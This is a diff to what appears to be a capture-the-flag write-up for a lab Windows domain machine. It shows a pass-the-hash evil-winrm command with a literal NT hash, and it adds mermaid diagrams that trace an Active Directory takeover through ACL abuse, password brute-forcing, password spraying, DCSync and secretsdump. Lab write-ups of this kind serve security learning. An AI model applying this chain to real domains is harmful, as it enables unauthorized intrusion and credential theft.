@@ -288,3 +288,31 @@ This dumps the domain credentials in the format `domain\uid:rid:lmhash:nthash`. 
 ```bash
 evil-winrm -i administrator.htb -u "administrator.htb\Administrator" -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
 ```
+
+### Summary
+
+Below is a visualized summary of the exploitation steps used in this machine to gain RCE.
+
+``` mermaid
+graph LR
+  A[Olivia] -->|GenericAll| B[Michael];
+  B -->|ForceChangePassword| C[Benjamin];
+
+  D[Benjamin] -->|Access| E[FTP<br>service];
+  E -->|Read| F[Psafe3<br>file];
+  F -->|Brute-force<br>password| G[Valid<br>credentials];
+
+  H[Valid<br>credentials] -->|Password<br>spray| I[Emily];
+  I -->|Access| J[WinRM<br>service];
+```
+
+The privilege escalation to the user `Administrator` worked as follows:
+
+``` mermaid
+graph LR
+  A[Emily] -->|GenericWrite| B[Ethan];
+  B -->|DCSync| C[Administrator];
+
+  D[Administrator] -->|secretsdump| E[Administrator's<br>NT-Hash];
+  E --> F[WinRM<br>Access];
+```
